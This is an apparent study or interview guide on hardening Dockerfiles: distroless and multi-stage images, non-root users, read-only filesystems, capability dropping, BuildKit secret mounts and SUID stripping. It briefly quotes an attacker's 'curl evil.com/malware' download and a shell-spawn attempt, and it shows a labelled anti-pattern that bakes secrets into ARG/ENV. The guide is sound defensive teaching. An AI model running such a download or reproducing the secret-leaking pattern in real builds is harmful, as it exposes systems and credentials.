# Dockerfile Security, Image Hardening, and BuildKit Secrets

## 1. Topic & Definition
**Dockerfile Hardening** is the engineering practice of designing container images with minimal attack surfaces, zero hardcoded secrets, unprivileged runtime execution, and immutable filesystems.

By default, Docker containers run as the **root user (UID 0)** and inherit broad default capabilities from standard base images (e.g., Ubuntu, Debian) that include full shell interpreters, package managers, and compilation toolchains. Hardening strips unnecessary utilities, ensuring that even if an application suffers a Remote Code Execution (RCE) vulnerability, the attacker cannot escalate privileges, write persistence to disk, or execute lateral network tools.

---

## 2. Hardening Principles: The Golden Dockerfile Blueprint

### The Insecure vs. Hardened Dockerfile Architecture

```dockerfile
# ==============================================================================
# SECURE MULTI-STAGE DOCKERFILE BLUEPRINT
# ==============================================================================

# STAGE 1: Compilation & Dependency Build Environment (Disposable)
FROM python:3.12-slim AS builder

WORKDIR /build
# Install build tools needed strictly for compilation
RUN apt-get update && apt-get install -y --no-install-recommends \
    build-essential gcc libpq-dev && \
    rm -rf /var/lib/apt/lists/*

COPY requirements.txt .
# Build wheels into a clean isolated directory
RUN pip install --no-cache-dir --user -r requirements.txt


# STAGE 2: Hardened, Minimal Runtime Environment
# Using Google Distroless (Contains NO shell, NO package manager, NO curl/nc)
FROM gcr.io/distroless/python3-debian12:nonroot

WORKDIR /app

# Copy compiled Python packages from builder stage
COPY --from=builder /root/.local /root/.local
COPY --chown=nonroot:nonroot src/ /app/

# Enforce Non-Root Execution (Distroless nonroot UID is 65532)
USER nonroot

# Run directly without shell wrapping
ENTRYPOINT ["python3", "server.py"]
```

---

## 3. Core Hardening Techniques Detailed

### 1. The Non-Root Mandate (`USER 10001:10001`)
- **Vulnerability:** By default, if a Dockerfile does not specify `USER`, processes execute as `root` (UID 0). If an attacker achieves command execution via an application bug, they run with full root powers inside the container, facilitating kernel exploit breakouts.
- **Remediation:** Explicitly create an unprivileged system user and switch to it:
  ```dockerfile
  RUN addgroup --system --gid 10001 appgroup && \
      adduser --system --uid 10001 --ingroup appgroup --no-create-home appuser
  USER 10001:10001
  ```

### 2. Minimal Base Images: The Distroless Advantage
- **The Problem with Standard Images:** An image based on `ubuntu:latest` contains over 100 pre-installed packages—including `bash`, `apt`, `wget`, `nc`, and `tar`—giving attackers ready-made post-exploitation utilities.
- **Distroless Images (Google Container Tools):** Contain *only* the application runtime (e.g., Python, Node.js, Java) and minimal OS dependencies. They contain **no package manager, no shell (`/bin/sh`), and no terminal utilities**.
  - *Attacker Impact:* An attacker finding an RCE vulnerability attempts `os.system("/bin/sh")` or `curl evil.com/malware` and fails because `/bin/sh` and `curl` **do not exist on the filesystem**!

### 3. Read-Only Root Filesystems
- **Concept:** Run containers with an immutable filesystem:
  ```bash
  docker run --read-only --tmpfs /tmp --tmpfs /app/logs my-hardened-app
  ```
- **Security Impact:** Attackers cannot download web shells, drop rootkits, or overwrite existing application binaries. Any dynamic temporary data must be written to explicit RAM-backed `tmpfs` mounts that vanish on container restart.

### 4. Dropping Linux Capabilities
- By default, Docker grants approximately 14 capabilities. Production workloads should drop all capabilities and whitelist only required operations:
  ```bash
  docker run --cap-drop=ALL --cap-add=NET_BIND_SERVICE my-app
  ```

---

## 4. Docker BuildKit Secret Management (`--mount=type=secret`)

### The Fatal Flaw of `ARG` and `ENV` for Build Secrets
```dockerfile
# DISASTROUS ANTI-PATTERN: Secrets leak into image metadata!
ARG GITHUB_TOKEN
ENV DB_PASSWORD=secret123
RUN git clone https://${GITHUB_TOKEN}@github.com/corp/private-repo.git
```
- Running `docker history <image>` or `docker inspect` allows anyone to view the values of `ARG` and `ENV` in plaintext, forever baked into intermediate image layers.

### The BuildKit Solution (Temporary Secret Mounts)
BuildKit mounts secrets into a temporary in-memory filesystem during the `RUN` command, guaranteeing that secrets **never get cached in any image layer or history**:

```dockerfile
# syntax=docker/dockerfile:1
FROM alpine:3.20

# Secret is mounted in memory strictly for the duration of this single command!
RUN --mount=type=secret,id=git_token \
    TOKEN=$(cat /run/secrets/git_token) && \
    git clone https://${TOKEN}@github.com/corp/private-repo.git
```
```bash
# Build command passing secret safely:
DOCKER_BUILDKIT=1 docker build --secret id=git_token,src=./token.txt -t app:safe .
```

---

## 5. Key Differences Matrix: Container Base Image Flavors

| Image Flavor | Approximate Size | Included OS Tools | Shell Included? | Vulnerability Count (Typical) |
| :--- | :--- | :--- | :--- | :--- |
| **Ubuntu / Debian** | 80 – 120 MB | Full suite (`apt`, `curl`, `perl`, `bash`) | Yes (`/bin/bash`) | High (50 – 100+ CVEs) |
| **Alpine Linux** | 5 – 8 MB | Minimal musl libc, busybox tools (`apk`) | Yes (`/bin/sh`) | Low (0 – 5 CVEs) |
| **Google Distroless** | 15 – 30 MB | Runtime libraries only (glibc/openssl) | **NO** | **Near Zero (0 – 1 CVEs)** |
| **Scratch** | **0 MB** | Absolutely nothing (Static binaries) | **NO** | **Zero CVEs** |

---

## 6. Cybersecurity Relevance, Threats & Attack Vectors

### 1. Insecure Layer Caching & Secret Residue
- **Mechanism:** A developer creates a layer containing a secret and attempts to delete it in the next line:
  ```dockerfile
  RUN curl -O https://corp.com/cert.pem
  RUN rm cert.pem
  ```
- **The Layer Trap:** Because Docker layers are immutable, `cert.pem` exists permanently inside the first layer tarball! Anyone with `docker pull` can extract the intermediate layer and recover `cert.pem`.
- **Defense:** Combine operations in a single `RUN` command or use multi-stage builds and BuildKit secrets.

### 2. Privilege Escalation via SUID Binaries
- **Risk:** Base images sometimes include setuid binaries (e.g., `sudo`, `chsh`, `pkexec`). An unprivileged container process exploits an unpatched SUID vulnerability (e.g., PwnKit CVE-2021-4034) to gain container root.
- **Defense:** Strip all SUID/SGID bits during container build:
  ```dockerfile
  RUN find / -perm /6000 -type f -exec chmod a-s {} + 2>/dev/null || true
  ```

---

## 7. Interview Takeaways & Rapid-Fire Q&A

### 60-Second Elevator Pitch
> *"Dockerfile hardening is essential for minimizing the attack surface of containerized workloads. Production containers must never execute as the default root user (UID 0); they must specify dedicated unprivileged users like `USER 10001`. Leveraging multi-stage builds ensures compilers, developer tools, and temporary files remain in disposable build stages, producing lightweight production runtime images. Adopting minimal base images like Google Distroless eliminates shells (`/bin/sh`) and package managers entirely, crippling post-exploitation attempts. Finally, runtime hardening mandates running with `--read-only` root filesystems, dropping all Linux capabilities (`--cap-drop=ALL`), and utilizing Docker BuildKit secret mounts (`--mount=type=secret`) to prevent credential leakage into immutable image layers."*

### Candidate Traps & Common Mistakes
- **Trap 1:** Passing passwords via `ARG` or `ENV` in Dockerfiles. *Correction:* `ARG` and `ENV` persist permanently in image layer metadata viewable via `docker history`; use Docker BuildKit secret mounts.
- **Trap 2:** Deleting secrets in a subsequent `RUN` step. *Correction:* Each `RUN` creates an immutable layer; deleting a file in a later layer merely hides it from the union view while leaving it accessible in earlier layer tarballs.
- **Trap 3:** Relying on Alpine Linux without testing glibc compatibility. *Correction:* Alpine uses `musl libc`, which can cause subtle runtime bugs, memory fragmentation, or performance drops in Python/Java apps compiled against `glibc`; Google Distroless Debian is often the superior `glibc`-compatible choice.

### Expected Follow-Up Questions
1. *What is Hadolint?*
   - An open-source static analysis linter specifically for Dockerfiles that parses the AST and validates syntax against CIS Docker Benchmark security best practices (e.g., flagging missing non-root users, unpinned package versions, or untrusted curl pipes).
2. *Why should containers run with an immutable read-only root filesystem (`--read-only`)?*
   - Because it prevents attackers from modifying application source files, installing backdoors, or downloading malicious binaries onto disk during an exploitation attempt.
